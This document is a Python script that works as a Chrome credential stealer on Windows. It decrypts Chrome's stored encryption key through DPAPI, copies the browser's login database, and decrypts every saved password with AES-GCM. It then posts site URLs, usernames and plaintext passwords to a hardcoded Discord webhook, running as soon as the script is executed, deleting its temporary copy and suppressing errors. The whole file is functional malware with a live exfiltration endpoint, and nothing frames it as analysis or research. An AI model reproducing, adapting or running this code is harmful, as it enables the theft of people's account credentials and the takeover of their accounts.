import json
import datetime
import os 
import win32crypt
import os
import shutil
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
import requests


class getChrome:

        def __init__(self):
            self.grabbedWebhook = self.grab_json_data()

        def grab_json_data(self):
            return "https://discord.com/api/webhooks/1348059635491274784/l-5hArG0fRmKvNzKpyOe-aeqyV3WFQ0BpO5-VVmvipBQnVNrVufuXjrjUR-ZGgXQTbps"


        def get_C(self):
            def chrome_date_and_time(chrome_data):
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

            def fetching_encryption_key():
                local_computer_directory_path = os.path.join(
                    os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
                    "User Data", "Local State")
                with open(local_computer_directory_path, "r", encoding="utf-8") as f:
                    local_state_data = json.loads(f.read())
                encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
                return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

            def password_decryption(password, encryption_key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) if password else "No Passwords"

            key = fetching_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")

            discord_message = ""
            for row in cursor.fetchall():
                main_url, login_page_url, user_name, password_value, date_of_creation, last_usage = row
                decrypted_password = password_decryption(password_value, key)
                if user_name or decrypted_password:
                    discord_message += f"main url: {main_url}\n**Login URL:** {login_page_url}\n**Username:** {user_name}\n**Decrypted Password:** {decrypted_password}\n"
                    if date_of_creation != 86400000000 and date_of_creation:
                        discord_message += f"password created: {chrome_date_and_time(date_of_creation)}\n"
                    if last_usage != 86400000000 and last_usage:
                        discord_message += f"last used: {chrome_date_and_time(last_usage)}\n"
                    discord_message += "=" * 100 + "\n"

            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass

            if not discord_message:
                discord_message = "No Chrome passwords found."

            headers = {"Content-Type": "application/json"}
            data = {
                "embeds": [{"title": "Chrome Passwords", "description": discord_message, "color": 5620992}]
            }

            try:
                requests.post(self.grabbedWebhook, json=data, headers=headers)
            except:
                pass


gc = getChrome()
gc.get_C()